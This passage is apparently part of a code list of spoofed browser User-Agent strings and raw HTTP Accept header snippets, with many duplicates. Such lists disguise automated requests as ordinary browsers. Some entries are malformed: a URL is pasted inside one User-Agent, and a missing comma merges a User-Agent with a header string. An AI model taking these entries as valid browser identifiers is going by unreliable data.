     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
